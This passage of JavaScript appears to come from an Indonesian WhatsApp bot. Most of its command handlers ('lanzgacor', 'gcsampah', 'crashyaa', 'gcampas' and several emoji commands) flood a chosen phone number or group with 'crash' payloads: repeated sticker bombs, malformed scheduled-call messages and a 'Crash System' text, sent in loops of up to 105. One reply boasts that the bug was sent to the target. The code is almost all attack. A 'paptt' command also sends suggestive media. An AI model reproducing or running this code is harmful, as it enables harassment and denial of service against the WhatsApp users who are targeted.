qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
m.reply(`*UDAH DI SENDYA BROK*`)
break

case 'lanzgacor': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = "105"
for (let i = 0; i < jumlah; i++) {
bug = { 
key: {
fromMe: ['Lanzz'], 
participant: '', ...('' ? { remoteJid: "" } : {}) 
},
'message': {
"documentMessage": {
"fileName": global.doku2,
"remoteJid": "",
}}}
scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": global.doku2,
}
}), { userJid: from, quoted : lanzbatosai})
qio.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(2500)
}
await replyy(`UDAH DI SEND YA BROK`)
break

case '🥰': case '😍': case '🤩': case '😠': case '🙁': case '😵': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan link Group')
Pe = qtext.split("|")[0]+'@g.us'
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'gcampas': case 'lanzgasken':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan link Group')
Pe = qtext.split("|")[0]+'@g.us'
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(from, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'gcsampah': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan link Group')
Pe = qtext.split("|")[0]+'@g.us'
jumlah = "105"
for (let i = 0; i < jumlah; i++) {
bug = { 
key: {
fromMe: ['Lanz'], 
participant: '', ...('' ? { remoteJid: "" } : {}) 
},
'message': {
"documentMessage": {
"fileName": global.doku2,
"remoteJid": "",
}}}
scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": global.doku2,
}
}), { userJid: from, quoted : lanzbatosai})
qio.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(2500)
}
await replyy(`Bug telah sukses terkirim dinomor target : ${Pe}`)
break

case 'ytmp3': case 'youtubemp3': {
if (!isCreator) return m.reply('*.*')
if (!q) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
await loading()
downloadMp3(q)
}
break

case 'cek?': {
m.reply('Bot Siap Digunakan 🤗')
}
break

case 'bugvid1':
if (!isCreator) return m.reply('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug1.mp4')
qio.sendMessage(from, {video: bugvid1},{quoted: lanzelitcees})
break

case 'bugvid2':
if (!isCreator) return m.reply('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug2.mp4')
qio.sendMessage(from, {video: bugvid1},{quoted: lanzelitcees})
break

case 'paptt':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return replyy(`Example ${prefix + command} foto/video`)
papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
titid1 = (pickRandom(papttfoto))
titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
replyy("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
qio.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
replyy("Video Akan Dikirim Lewat Private Chat ( *PC* )")
qio.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: m })
}
break

case 'tourl': {
if (!isCreator) return m.reply(global.nocreator)
if (!quoted) return replyy(`m.reply Medianya`)
replyy('*harap tunggu sebentar*')
let media = await qio.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await TelegraPh(media)
replyy(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await TelegraPh(media)
replyy(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await UploadFileUgu(media)
replyy(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case 'crashyaa':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzelitcees })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
